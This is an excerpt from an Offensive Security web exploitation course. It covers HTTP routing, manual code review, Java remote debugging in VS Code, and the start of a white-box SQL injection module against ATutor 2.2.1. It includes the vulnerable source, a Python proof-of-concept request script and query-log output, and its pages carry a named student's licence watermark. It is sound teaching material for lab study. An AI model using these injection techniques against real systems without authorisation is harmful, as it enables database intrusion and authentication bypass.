Some Java applications use Servlet Mappings to control how the application handles HTTP 
requests. In Java web applications, “servlet” is a shorthand for the classes that handle requests, 
such as HTTP requests. In general, they implement code that accepts a request and returns a 
response. A web.xml file stores the HTTP routing configuration. While there can be multiple 
entries in a web.xml file, each route is made up of two entries: one entry to define a servlet and a 
second entry to map a URL to a servlet. 
Let’s review an example. 
<!-- SubscriptionHandler--> 
<servlet id="SubscriptionHandler"> 
  <servlet-name>SubscriptionHandler</servlet-name> 
  <servlet-
class>org.opencrx.kernel.workflow.servlet.SubscriptionHandlerServlet</servlet-class> 
    </servlet> 
... 
<servlet-mapping> 
  <servlet-name>SubscriptionHandler</servlet-name> 
 
23 (Apache Software Foundation, 2020), https://httpd.apache.org/docs/2.4/urlmapping.html 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
56 
    <url-pattern>/SubscriptionHandler/*</url-pattern> 
</servlet-mapping> 
Listing 15 - Excerpt from a web.xml file for OpenCRX 
In this example, the web.xml file defines a servlet with the “SubscriptionHandler” id for the 
org.opencrx.kernel.workflow.servlet.SubscriptionHandlerServlet class. A “servlet-mapping” entry 
maps the /SubscriptionHandler/* URL to the SubscriptionHandler. The star character indicates a 
wildcard. The servlet class is responsible for parsing the URL path and deciding what to do with 
HTTP requests. 
Some programming languages and frameworks include routing information directly in the source 
code. For example, ExpressJS uses this method of routing: 
var express = require('express'); 
var router = express.Router(); 
... 
 
router.get('/login', function(req, res, next) { 
  res.render('login', { title: 'Login' }); 
}); 
Listing 16 - Example Express.js routing From DocEdit 
A variant of this approach is routing by annotation or attribute. The Spring MVC24 framework for 
Java and the Flask25 framework for Python, among others, use this approach. The source code 
declares an annotation or attribute next to the method or function that handles the HTTP request. 
@GetMapping({"/admin/users"}) 
public String getUsersPage(HttpServletRequest req, Model model, HttpServletResponse 
res) { 
... 
Listing 17 - Example Spring MVC annotation 
In this example, the server calls the getUsersPage() method when it receives a GET request to the 
/admin/users URL path. There are also annotations that handle request mapping for different 
HTTP methods or more complex URI paths. 
These are basic HTTP routing examples. Each programming language and framework offers 
variations, but most will resemble those covered above. We’ll explore additional routing methods 
in various other modules in this course. 
2.4.4 Analyzing Source Code for Vulnerabilities 
We believe that there is simply no adequate substitute for a manual code review since many 
coding nuances and complex code paths to vulnerable functions are often missed by automated 
tools. While we certainly do not rely solely on automated source code analysis tools, it is 
important to mention them as they do serve a purpose. Specifically, these tools are generally very 
capable of identifying “low-hanging fruit” vulnerabilities, which can save time. Generally speaking, 
although they also identify a large number of false positive results in a given application, even 
these results can help us identify dead-ends in the code, which once again saves us time. 
 
24 (Spring, 2016), https://docs.spring.io/spring-framework/docs/3.2.x/spring-framework-reference/html/mvc.html#mvc-controller 
25 (Pallets, 2010), https://flask.palletsprojects.com/en/1.1.x/quickstart/#routing 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
57 
There is no doubt that manual reviews are very time-consuming but the knowledge gained 
through this process builds upon itself over time. This knowledge can help us discover more 
complex vulnerabilities, which may have otherwise gone undetected. 
As with most security testing, our goal is to strike a balance between time, effort, and quality. We 
might miss vulnerabilities in large applications during code reviews and penetration tests due to 
time constraints and prioritization. 
For example, it’s common to place external libraries and dependencies lower on the priority list 
than application source files. This trade-off is usually made on the assumption that an external 
library might have a vulnerability, but the application being analyzed might never call the 
vulnerable feature of the dependency. However, in smaller applications, pivoting to analyze 
external libraries and dependencies may expand our attack surface if the application relies on 
them heavily. 
With this in mind, there are many high-priority items to consider when performing manual source 
code analysis. This high-level list is presented in no particular order: 
• 
After checking unauthenticated areas, focus on areas of the application that are likely to 
receive less attention (i.e.  authenticated portions of the application). 
• 
Investigate how sanitization of the user input is performed. Is it done using a trusted, open-
source library, or is a custom solution in place? 
• 
If the application uses a database, how are queries constructed? Does the application 
parameterize input or simply sanitize it? 
• 
Inspect the logic for account creation or password reset/recovery routines. Can the 
functionality be subverted? 
• 
Does the application interact with its operating system? If so, can we modify commands or 
inject new ones? 
• 
Are there programming language-specific vulnerabilities? 
This list could be expanded exponentially. We will cover these items and more throughout the 
course. A personal methodology and depth of knowledge for manual source code analysis grows 
over time. Analyzing source code to identify vulnerabilities will help us build our own 
methodology. By understanding how these vulnerabilities are coded, we can apply our knowledge 
to other applications, even those that are closed-source. 
2.5 Debugging 
One of the best ways to understand an application is to run it through a debugger, which allows 
us to inspect application memory and call stacks. This information can be invaluable when 
crafting an exploit. Some debuggers also support debugging a process running on a remote 
system. This is known as remote debugging. 
Debugging reveals the inner-workings of the application at runtime. To get 
similar information from databases, we can enable database query logging while 
we are testing an application. We will use database query logging in other 
modules. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
58 
Let’s try debugging a simple Java application using Visual Studio Code. We will need to install two 
plugins: the RedHat Language Support for Java26 and the Microsoft Debugger for Java.27 
Let’s create a sample Java application that generates a random number and asks us to guess the 
number. We will create a new directory named debug and create DebuggerTest.java which 
contains the following code: 
import java.util.Random; 
import java.util.Scanner; 
 
public class DebuggerTest { 
 
  private static Random random = new Random(); 
  public static void main(String[] args){ 
    int num = generateRandomNumber(); 
        Scanner scanner = new Scanner(System.in); 
        System.out.println("Guess a number between 1 and 100."); 
        try{ 
      int answer = scanner.nextInt(); 
      scanner.close(); 
      System.out.println("Your guess was: " + answer); 
      if(answer == num) { 
        System.out.println("You are correct!"); 
      } else { 
        System.out.println("Incorrect. The answer was " + num); 
      } 
    } catch(Exception e) { 
      System.out.println("That's not a number."); 
    } finally { 
      scanner.close(); 
    } 
    System.exit(0); 
  } 
 
  public static int generateRandomNumber() { 
    return random.nextInt(100)+1; 
  } 
} 
Listing 18 - Another simple Java Application 
We can debug this application right from our IDE, but first we need to set a breakpoint by clicking 
to the left of line numbers. Let’s set one on line 8. 
 
26 (Microsoft, 2021), https://marketplace.visualstudio.com/items?itemName=redhat.java 
27 (Microsoft, 2021), https://marketplace.visualstudio.com/items?itemName=vscjava.vscode-java-debug 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
59 
 
Figure 54: A breakpoint is set on line eight 
A red dot will appear next to the line number at the location of our breakpoint. Now that we have 
set a breakpoint, we can debug the application by clicking on Run, then Run and Debug. 
 
Figure 55: Run and Debug 
The debugger will start running our code until it hits the breakpoint. Once execution reaches the 
breakpoint, the program will pause, and our IDE will highlight the line where execution paused. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
60 
 
Figure 56: Breakpoint is reached 
We also have a new debugging context menu. The buttons, from left to right, are Continue, Step 
Over, Step Into, Step Out, Restart, Stop, and Hot Code Replace. Let’s briefly discuss each of these. 
If we click Continue, the application will resume execution until it completes or hits another 
breakpoint. Step Over allows the next method call to execute and will pause execution at the next 
line in the current method. In our case, it would execute the call to generateRandomNumber() then 
pause when execution returns to line 9. Step Into would follow the execution flow into 
generateRandomNumber() and pause on line 28. Step Out allows the current method to run and 
then pauses when execution is passed back “one level”. If we pressed Step Out while execution 
was paused in the main() method, execution would complete. If we pressed it while in the 
generateRandomNumber() method, execution would return to main() and then pause again. 
Restart and Stop are self-explanatory. 
Hot Code Replace allows us to modify the source file and push changes to the executing process. 
However, this feature isn’t available in all programming languages. 
Let’s click Step Over. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
61 
 
Figure 57: The Variables have been updated 
The debugger has now paused execution on line 9 and the Variables window has updated to 
display the value of the num variable. We can also get the value of a variable by hovering our 
mouse cursor over it. Let’s click Continue to allow the application to run. We can now “predict” the 
correct number every time we play this game. 
2.5.1 Remote Debugging 
Remote debugging allows us to debug a process running on a different system as long as we 
have access to the source code and the debugger port on the remote system. 
Let’s try it out on a Java application. The JAR file and a ZIP file containing the source code are 
available on the course wiki. We will extract the ZIP file, add the files to Visual Studio Code by 
clicking on File > Open Folder, and then select the extracted NumberGame directory. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
62 
 
Figure 58: NumberGame Explorer view 
Let’s open MainController.java and set a breakpoint on line 22. Our IDE might underline some 
imports or objects in the file because we haven’t configured our build path. We should still be able 
to debug the code despite these warnings. However, if the application executes code from within 
a source file that we do not have, we wouldn’t be able to follow the execution into that file. 
Let’s add the dependencies to VS Code. We can extract them from the JAR file. The 
@SprintBootApplication annotation in MainController.java indicates this is a Spring Boot 
application. We can find the dependencies in /BOOT-INF/lib/ inside the JAR file. VS Code should 
automatically import the dependencies if we place them in a lib directory inside the NumberGame 
directory. 
kali@kali:~$ unzip -j NumberGame.jar "BOOT-INF/lib/*" -d NumberGame/lib/  
Archive:  NumberGame.jar 
 extracting: NumberGame/lib/thymeleaf-spring5-3.0.12.RELEASE.jar   
 extracting: NumberGame/lib/thymeleaf-extras-java8time-3.0.4.RELEASE.jar   
 extracting: NumberGame/lib/spring-webmvc-5.3.4.jar   
 extracting: NumberGame/lib/spring-web-5.3.4.jar   
 extracting: NumberGame/lib/spring-boot-autoconfigure-2.4.3.jar   
 extracting: NumberGame/lib/spring-boot-2.4.3.jar   
... 
Listing 19 - Using unzip to extract dependencies 
Once the dependencies are extracted, VS Code should be able to resolve all the dependencies. We 
can verify the dependencies were loaded properly by clicking on Java Project in the lower-left 
section of VS Code. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
63 
 
Figure 59: Java Projects tab 
Once the Java Projects pane expands, we can click on Project and External dependencies to 
expand the list of dependencies and verify that the extracted JARs are listed. 
 
Figure 60: References Libraries 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
64 
2.5.1.1.1 
 
If the JAR files are not listed, we can add them manually by clicking the + button next to Project 
and External Dependencies and selecting them from the resulting file window. 
Now that we have the dependencies added, we will need a launch.json file to perform remote 
debugging. Visual Studio Code will create one for us if we click on the Run shortcut and then click 
create a launch.json file. 
 
Figure 61: Create a launch.json file 
After a few moments, launch.json should open in an Editor window. If the Editor window does not 
open, we can find the new file in the .vscode directory. We can ignore the default configurations. 
We will create a new configuration for remote debugging by clicking Add Configuration… and then 
Java: Attach to Remote Program on the pop-up menu. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
65 
 
Figure 62: Adding a new configuration 
We need to update the “hostName” value to “127.0.0.1” and the “port” value to 9898. We’ll then 
save the changes. 
 
Figure 63: Remote debugging configuration 
Now that we have configured launch.json, we can run the JAR file with debugging enabled. We 
will 
include 
the 
-
agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=9898 flag to enable 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
66 
debugging on port 9898.28 Since we are only specifying a port number in the address option, the 
debugger socket will only listen on localhost.  
kali@kali:~$ java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=9898 -
jar NumberGame.jar  
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true 
Listening for transport dt_socket at address: 9898 
... 
2021-03-02 14:14:40.887  INFO 11376 --- [           main] 
o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat started on port(s): 8000 (http) with 
context path '' 
2021-03-02 14:14:40.896  INFO 11376 --- [           main] 
com.offsec.awae.NumberGameApplication    : Started NumberGameApplication in 2.509 
seconds (JVM running for 3.11) 
Listing 20 - Starting the NumberGame jar 
Now that the application has started, we can access it on port 8000 with our browser. 
 
Figure 64: Number Guessing Game loaded in browser 
Before we submit a value, let’s start our debugger. In VS Code, we need to click on the Run button 
if the Run view isn’t still open. Then we will click on the dropdown menu next to the green arrow 
and click Attach to Remote Program. 
 
28 (Oracle, 2021), https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/conninv.html#Invocation 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
67 
 
Figure 65: Selecting a Run configuration 
Now that we have selected the configuration we want, we can start the debugger by clicking the 
Start Debugging button (the green arrow). 
Depending on our configuration, we might receive a pop-up asking for us to switch the Java 
language server to run in Standard mode. We can click Yes on this pop-up. 
 
Figure 66: Switching Java Language Server to Standard Mode 
Once the debugger has established a connection with the remote program, the debugging context 
menu should open. We can verify everything is working by submitting a number on the web page 
and checking if the debugger pauses on our breakpoint. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
68 
 
Figure 67: Breakpoint has been hit 
The debugger reached the breakpoint and paused execution. Let’s click Step Over twice to break 
execution on line 26. We’ll click on this: Main Controller in the Variables window to find the value of 
the answer variable. 
 
Figure 68: Finding the value of “answer” 
Now that we have the answer, we can click Continue to let execution resume. We can submit 
another request with the correct answer. When we are finished with the debugger connection, we 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
69 
can click Disconnect. We can then switch to our terminal and press C+c to stop the Java 
application. 
While this application’s functionality is trivial, this exercise demonstrates the value of remote 
debugging when developing exploits for web applications. This section served as an introduction 
to the remote debugging, and we will use this process extensively throughout the rest of the 
course. 
2.5.1.2 Exercises 
1. 
Repeat the steps outlined in this section and familiarize yourself with remote debugging in 
VS Code. 
2. 
Start the lab debugger machine and run the NumberGame.jar from that machine. Remote 
debug the application from your local Kali machine. You’ll find the IP address and machine 
credentials for the debugger in your control panel. Remember to enable remote connections 
for debugging when running the JAR. 
2.6 Wrapping Up 
In this module we covered some of the fundamental tools and techniques used for whitebox web 
application assessments. We reviewed how to use Burp Suite to inspect and modify HTTP traffic. 
In addition, we set the groundwork for source code analysis by demonstrating how to recover 
Java and .NET source code and started creating our own methodology for analyzing that code for 
vulnerabilities. Now that we have demonstrated these basic techniques, we’ll leverage them to 
examine a variety of vulnerable applications and explore the various vulnerabilities they contain. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
70 
2.6.1.1.1 
 
3 ATutor Authentication Bypass and RCE 
ATutor is a web-based Learning Management System that has been in existence for a number of 
years and according to the information found on the vendor website, it is used by thousands of 
organizations.29 Given the relatively large user base, we decided to take a look under the hood. 
This was made easier in part due to the fact that ATutor is open source so anybody can perform 
a source code audit. 
This module will cover the in-depth analysis and exploitation of multiple vulnerabilities in ATutor 
2.2.1. The first vulnerability we will investigate is a SQL injection that can be used to disclose 
sensitive information from the ATutor backend database. Once disclosed, this information can be 
used to effectively subvert the authentication mechanism. Finally, once privileged access is 
gained, we will exploit a post-authentication file upload vulnerability that leads to remote code 
execution. 
3.1 Getting Started 
Revert the ATutor virtual machine from your student control panel. You will find the credentials for 
the ATutor server and application accounts in the Wiki. 
ATutor provides you with 3 levels of access: 
1. 
Student 
2. 
Teacher 
3. 
Administrator 
For the purposes of this module, we will be attacking the vulnerable ATutor instance from an 
unauthenticated perspective, so we will not need credentials. In latter parts of the module, we will 
however use the appropriate credentials in order to ease the exploit development process. 
3.1.1 Setting Up the Environment 
In this module, we will be attacking the ATutor application from a white-box perspective. We will 
analyze the source code of the target application and enable database logging in order to inspect 
all SQL queries processed by the backend database. This will make our vulnerability discovery 
and exploit development much easier. 
ATutor uses the MySQL database engine and in order to enable database logging, we can log in 
via SSH to the target server and make the necessary changes. 
Once logged in, we’ll open the MySQL server configuration file located at /etc/mysql/my.cnf and 
uncomment the following lines under the Logging and Replication section: 
student@atutor:~$ sudo nano /etc/mysql/my.cnf 
[mysqld] 
... 
 
29 (ATutor, 2020), https://atutor.github.io/ 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
71 
general_log_file        = /var/log/mysql/mysql.log 
general_log             = 1 
Listing 21 - Editing the MySQL server configuration file to log all queries 
After modifying the configuration file, we need to restart the MySQL server in order for the change 
to take effect: 
student@atutor:~$ sudo systemctl restart mysql 
Listing 22 - Restarting the MySQL server to apply the new configuration 
We can then use the tail command to inspect the MySQL log file and see all queries being 
executed by the web application as they happen. 
student@atutor:~$ sudo tail –f /var/log/mysql/mysql.log 
Listing 23 - Finding all queries being executed by ATutor 
To test the query logging setup through the tail command, we can simply browse the ATutor web 
application. 
 
Figure 69: Performing a search against the ATutor web application 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
72 
3.1.1.1.1 
 
 
Figure 70: Verifying that query logging is working as expected 
Furthermore, since we are dealing with a PHP web application, we can also enable the PHP 
display_errors directive. With this directive turned on, we will be able to see any PHP errors we 
trigger in a verbose form, which can aid us during our analysis. To do that, we add the following 
line to the /etc/php5/apache2/php.ini file: 
display_errors = On 
Listing 24 - Configuring PHP to display verbose error 
Finally, we need to restart the Apache service for the new configuration setting to take effect. 
student@atutor:~$ sudo systemctl restart apache2 
Listing 25 - Restarting the Apache server to apply the new configuration 
With MySQL and Apache configured for whitebox testing, we are ready to start our vulnerability 
discovery process for the ATutor web application. 
3.2 Initial Vulnerability Discovery 
As is always the case when we have access to the source code, we first like to just look around 
and get a feel for the application. How is it organized? Can we identify any coding style that can 
help us with string searches against the code base? Is there anything else that can help us 
streamline and minimize the amount of time we need to properly investigate our target? 
As we were doing that, we realized that it was fairly easy to identify all publicly accessible ATutor 
webpages. More specifically, all pages that do not require authentication contain the following 
line in their source code: 
$_user_location = 'public'; 
Listing 26 - All publically accessible ATutor web pages can be easily identified 
It is important to always analyze the unauthenticated code portions first, since they are most 
sensitive to attacks as anyone can reach them. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
73 
As we will see in this module, a vulnerability in the unauthenticated portion of the code will allow 
us to get an initial foothold on the system, which will then be escalated by exploiting other 
vulnerabilities in the protected sections of the application. 
With that in mind, we decided to enumerate all pages we could access without authentication 
using a grep search and used the results as a starting point for our analysis. 
The following grep search will allow you to repeat this process for yourself: 
student@atutor:~$ grep -rnw /var/www/html/ATutor -e "^.*user_location.*public.*" --
color 
 
Listing 27 - Enumerating all publicly accessible ATutor pages 
Although this search did catch a few false positives, we ended up with a subset of roughly 85 
ATutor webpages. Given the fact that ATutor uses a database backend, we decided to start 
looking for traditional SQL injection vulnerabilities in these pages or in functions directly called 
from these pages. 
After spending some time doing so, we discovered a potentially interesting find. Let’s look at the 
code found in /var/www/html/ATutor/mods/_standard/social/index_public.php: 
14: $_user_location    = 'public'; 
15:  
16: define('AT_INCLUDE_PATH', '../../../include/'); 
17: require(AT_INCLUDE_PATH.'vitals.inc.php'); 
18: require_once(AT_SOCIAL_INCLUDE.'constants.inc.php'); 
19: require(AT_SOCIAL_INCLUDE.'friends.inc.php'); 
20: require(AT_SOCIAL_INCLUDE.'classes/PrivacyControl/PrivacyObject.class.php'); 
21: require(AT_SOCIAL_INCLUDE.'classes/PrivacyControl/PrivacyController.class.php'); 
Listing 28 - Some of the source code of index_public.php 
The $_user_location variable indicates public accessibility and after reviewing the files from the 
require statements as well as the remainder of index_public.php, we verified that there is no 
authentication code. Furthermore, accessing this web page through a browser confirms that we 
are indeed able to reach this section without authentication (Figure 71). 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
74 
 
Figure 71: We can reach index_public.php without authentication 
Inspecting index_public.php, we see checks for the p and rand_key GET variables, but nothing that 
seems to prevent us from reaching the first if statement on line 38, which is where things get a bit 
more interesting. 
23: if(isset($_POST['rand_key'])){ 
24:     $rand_key = $addslashes($_POST['rand_key']);        //should we excape? 
25: } 
26: //paginator settings 
27: if(isset($_GET['p'])){ 
28:     $page = intval($_GET['p']); 
29: } 
30: if (!isset($page)) { 
31:     $page = 1; 
32: }    
33: $count  = (($page-1) * SOCIAL_FRIEND_SEARCH_MAX) + 1; 
34: $offset = ($page-1) * SOCIAL_FRIEND_SEARCH_MAX; 
35:  
36:  
37: //if $_GET['q'] is set, handle Ajax. 
38: if (isset($_GET['q'])){ 
39:     $query = $addslashes($_GET['q']); 
40:  
41:     //retrieve a list of friends by the search 
42:     $search_result = searchFriends($query); 
43:  
44:  
45:     if (!empty($search_result)){ 
46:         echo '<div class="suggestions">'._AT('suggestions').':<br/>'; 
47:         $counter = 0; 
48:         foreach($search_result as $member_id=>$member_array){ 
49:             //display 10 suggestions 
50:             if ($counter > 10){ 
51:                 break; 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
75 
52:             } 
53:  
54:             echo '<a href="javascript:void(0);" 
onclick="document.getElementById(\'search_friends\').value=\''.printSocialName($member
_id, false).'\'; 
document.getElementById(\'search_friends_form\').submit();">'.printSocialName($member_
id, false).'</a><br/>'; 
55:             $counter++; 
56:         } 
57:         echo '</div>'; 
58:     } 
59:     exit; 
60: } 
 
Listing 29 - Unauthenticated call to a searchFriends function. 
In Listing 29, the code first checks if the GET parameter q is set (line 38) and if it is, the value that 
it holds is seemingly sanitized using the addslashes function (line 39). Immediately after that, our 
user-controlled value is passed on to the searchFriends function (line 42). 
Reading the above code should cause you to pause for a moment. Any time we see variable 
names such as query or qry, or function names that contain the string search, our first instinct 
should be to follow the path and see where the code takes us. It may lead us to nothing or it may 
lead to code that properly handles user-controlled data, leaving us nothing to work with. 
Nevertheless, even in a worst case scenario, we could learn how the application handles user 
input, which can save us time later on when we encounter similar situations. 
With that said, we will follow this function call and see what we are dealing with. A quick grep 
search such as the following helps us find the searchFriends function implementation. 
student@atutor:~$ grep -rnw /var/www/html/ATutor -e "function searchFriends" --color 
./mods/_standard/social/lib/friends.inc.php:260:function searchFriends($name, 
$searchMyFriends = false, $offset=-1){ 
Listing 30 - Searching for the searchFriends function implementation 
Let’s take a look at how the searchFriends() function is implemented in friends.inc.php. 
260: function searchFriends($name, $searchMyFriends = false, $offset=-1){ 
261:    global $addslashes; 
262:    $result = array();  
263:    $my_friends = array(); 
264:    $exact_match = false; 
265:  
266:    //break the names by space, then accumulate the query 
267:    if (preg_match("/^\\\\?\"(.*)\\\\?\"$/", $name, $matches)){ 
268:        $exact_match = true; 
269:        $name = $matches[1]; 
270:    } 
271:   $name = $addslashes($name);  
272:   $sub_names = explode(' ', $name); 
273:    foreach($sub_names as $piece){ 
274:        if ($piece == ''){ 
275:            continue; 
276:        } 
Listing 31 - Breaking up the $name variable 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
76 
If we look at the very beginning of Listing 31, we can see that $addslashes appears again, 
indicating that we will likely have to deal with some sort of sanitization. On line 271, we see that 
sanitization attempt happening as expected. Then, on line 272, our user-controlled $name variable 
is exploded30 into an array called $sub_names using a space as the separator, and it is looped 
through. 
278:        //if there are 2 double quotes around a search phrase, then search it as 
if it's "first_name last_name". 
279:        //else, match any contact in the search phrase. 
280:        if ($exact_match){ 
281:            $match_piece = "= '$piece' "; 
282:        } else { 
283:            //$match_piece = "LIKE '%$piece%' "; 
284:           $match_piece = "LIKE '%%$piece%%' "; 
285:        } 
286:        if(!isset($query )){ 
287:            $query = ''; 
288:        } 
289:       $query .= "(first_name $match_piece OR second_name $match_piece OR 
last_name $match_piece OR login $match_piece ) AND "; 
290:    } 
Listing 32 - The $match_piece variable is set within the LIKE statement 
In Listing 32 we find that on each iteration, the $piece variable is being concatenated into a string 
containing a SQL LIKE keyword (line 284). Finally, our semi-controlled $match_piece variable is 
incorporated into the partial SQL query ($query variable) on line 289. 
337:        $sql = 'SELECT * FROM '.TABLE_PREFIX.'members M WHERE '; 
338:        if (isset($_SESSION['member_id'])){ 
339:            $sql .= 'member_id!='.$_SESSION['member_id'].' AND '; 
340:        } 
341:    } 
342:    $sql = $sql . $query; 
343:    if ($offset >= 0){ 
344:        $sql .= " LIMIT $offset, ". SOCIAL_FRIEND_SEARCH_MAX; 
345:    } 
346:  
347:    $rows_members = queryDB($sql, array()); 
Listing 33 - The searchFriends() function is vulnerable to SQL injection 
In Listing 33, the $query variable is again concatenated to the $sql variable to form the final SQL 
query (line 342) which is subsequently passed to queryDB() (line 347). This function finally 
executes the query against the database. 
At this point in our analysis, we need to recall that we have seen at least two attempts to sanitize 
user-controlled input. In theory, this potential vulnerability seems well-defended (via addslashes), 
despite the fact that user-controlled input is part of a SQL query. However, if we send a properly 
crafted GET request with a payload containing a single quote, we observe something interesting 
as shown in Figure 72. 
 
30 (PHP Group, 2020), https://www.php.net/manual/en/function.explode.php 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
77 
 
Figure 72: Sending a single quote as a GET payload 
The same result can be achieved by using the following script, which we will use from this point 
on to send our payloads. 
import sys 
import re 
import requests 
from bs4 import BeautifulSoup 
 
def searchFriends_sqli(ip, inj_str): 
    target      = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % 
(ip, inj_str) 
    r = requests.get(target) 
    s = BeautifulSoup(r.text, 'lxml') 
    print "Response Headers:" 
    print r.headers 
    print 
    print "Response Content:" 
    print s.text 
    print 
    error = re.search("Invalid argument", s.text) 
    if error: 
        print "Errors found in response. Possible SQL injection found" 
    else: 
        print "No errors found" 
 
def main(): 
    if len(sys.argv) != 3: 
        print "(+) usage: %s <target> <injection_string>" % sys.argv[0] 
        print '(+) eg: %s 192.168.121.103 "aaaa\'" '  % sys.argv[0] 
        sys.exit(-1) 
 
    ip                  = sys.argv[1] 
    injection_string    = sys.argv[2] 
 
    searchFriends_sqli(ip, injection_string) 
 
if __name__ == "__main__": 
    main() 
Listing 34 - A simple Python scripts to send GET requests to ATutor 
kali@kali:~/atutor$ python poc1.py atutor "AAAA'" 
Response Headers: 
{'Content-Length': '153', 'Content-Encoding': 'gzip', 'Set-Cookie': 
'ATutorID=2mt5ucbd6h2lcnl27b3kcv43h7; path=/ATutor/, 
ATutorID=qcmepgkp8i0s3pc9nmbq7m2jc6; path=/ATutor/, 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
78 
ATutorID=qcmepgkp8i0s3pc9nmbq7m2jc6; path=/ATutor/', 'Vary': 'Accept-Encoding', 'Keep-
Alive': 'timeout=5, max=100', 'Server': 'Apache/2.4.10 (Debian)', 'Connection': 'Keep-
Alive', 'Date': 'Tue, 24 Apr 2018 17:08:57 GMT', 'Content-Type': 'text/html; 
charset=utf-8'} 
 
Response Content: 
 
Warning:  Invalid argument supplied for foreach() in 
/var/www/html/ATutor/mods/_standard/social/lib/friends.inc.php on line 350 
 
 
Errors found in response. Possible SQL injection found 
Listing 35 - After sending a string terminated by a single quote, we receive an error message 
Again, please remember that the returned warning is the result of the display_errors PHP directive 
being set to On. In a production environment this is seldom the case and cannot be relied upon. 
Nevertheless, the error points us to the file we are already familiar with (friends.inc.php), so let’s 
see what exactly is breaking. If we take a look at the line 350, we find the following: 
347:    $rows_members = queryDB($sql, array()); 
348:  
349:    //Get all members out 
350:    foreach($rows_members as $row){ 
351:        $this_id = $row['member_id']; 
Listing 36 - The location of where the PHP code breaks with our input 
Line 350 uses the $row_members variable, which should be populated with the results of the 
query executed on line 347. This indicates that the query may be broken. As we have enabled 
MySQL query logging, we can investigate the log file. When we do that, we see the following entry: 
student@atutor:~$ sudo tail –f /var/log/mysql/mysql.log 
          776 Query SELECT customized FROM AT_themes WHERE dir_name = 'default' 
          776 Query SELECT customized FROM AT_themes WHERE dir_name = 'default' 
          776 Query SELECT * FROM AT_courses ORDER BY title 
          776 Query SELECT dir_name, privilege, admin_privilege, status, 
cron_interval, cron_last_run FROM AT_modules WHERE status=2 
          776 Query SELECT L.* FROM AT_language_text L, AT_language_pages P WHERE 
L.language_code="en" AND L.term=P.term AND 
P.page="/mods/_standard/social/index_public.php" ORDER BY L.variable ASC 
          776 Query SELECT L.* FROM AT_language_text L WHERE L.language_code="en" AND 
L.term="test" ORDER BY variable ASC LIMIT 1 
          776 Query INSERT IGNORE INTO AT_language_pages (`term`, `page`) VALUES 
("test", "/mods/_standard/social/index_public.php") 
          776 Query SELECT * FROM AT_modules WHERE dir_name ='_core/services' && 
status ='2' 
          776 Query    SELECT * FROM AT_members M WHERE (first_name LIKE '%AAAA'%'  OR 
second_name LIKE '%AAAA'%'  OR last_name LIKE '%AAAA'%'  OR login LIKE '%AAAA'%'  ) 
          776 Quit 
Listing 37 - A single quote character part of our string payload, can be found unescaped in a SQL query 
